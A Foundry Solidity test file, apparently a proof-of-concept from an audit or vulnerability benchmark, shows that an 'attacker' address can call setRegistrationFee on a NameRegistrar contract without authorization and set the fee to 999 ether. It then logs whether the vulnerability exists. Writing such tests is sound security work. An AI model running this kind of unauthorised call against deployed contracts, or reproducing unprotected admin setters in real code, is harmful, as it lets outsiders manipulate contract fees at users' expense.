// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/name_registrar.sol";

contract NameRegistrarTest is Test {
    NameRegistrar registrar;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 constant NEW_FEE = 999 ether;

    function setUp() public {
        // Deploy contract by owner
        vm.prank(owner);
        registrar = new NameRegistrar();
    }

    function test_AnyUserCanSetRegistrationFee() public {
        console.log("--- BEFORE-Trigger Registration Fee ---");
        uint256 feeBefore = registrar.registrationFee();
        console.log("Current registration fee:", feeBefore);

        console.log("--- Trigger setRegistrationFee called by attacker ---");
        // Attacker changes registration fee without authorization
        vm.prank(attacker);
        registrar.setRegistrationFee(NEW_FEE);
        
        console.log("--- AFTER-Trigger Registration Fee ---");
        uint256 feeAfter = registrar.registrationFee();
        console.log("New registration fee:", feeAfter);

        bool vulnerabilityExists = feeAfter != feeBefore;
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully changed registration fee");
        } else {
            console.log("Vulnerability not Exist: Registration fee unchanged by attacker");
        }
    }
}